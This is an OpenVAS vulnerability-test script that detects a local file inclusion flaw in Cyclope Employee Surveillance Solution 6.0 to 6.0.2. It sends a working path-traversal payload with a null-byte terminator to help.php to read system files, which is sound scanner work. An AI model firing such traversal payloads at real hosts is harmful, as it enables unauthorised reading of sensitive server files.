###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cyclope_employee_surveillance_lfi_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802934");
  script_version("$Revision: 11857 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-08-16 12:28:45 +0530 (Thu, 16 Aug 2012)");
  script_name("Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20545/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115590/cyclopees-sqllfi.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 7879);
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
sensitive information.");
  script_tag(name:"affected", value:"Cyclope Employee Surveillance Solution versions 6.0 to 6.0.2");
  script_tag(name:"insight", value:"An improper validation of user-supplied input via the 'pag'
parameter to 'help.php', that allows remote attackers to view files and execute
local scripts in the context of the webserver.");
  script_tag(name:"solution", value:"Update to version 6.2.1 or later.");
  script_tag(name:"summary", value:"This host is running Cyclope Employee Surveillance Solution and
is prone to local file inclusion vulnerability.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://www.cyclope-series.com");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:7879);
if(!can_host_php(port:port)){
  exit(0);
}

sndReq = http_get(item:"/activate.php", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    url = "/help.php?pag=../../../../../../" +  files[file] + "%00";

    if(http_vuln_check(port:port, url:url,pattern:file,
       extra_check:make_list("Cyclope Employee")))
    {
      security_message(port:port);
      exit(0);
    }
  }
}
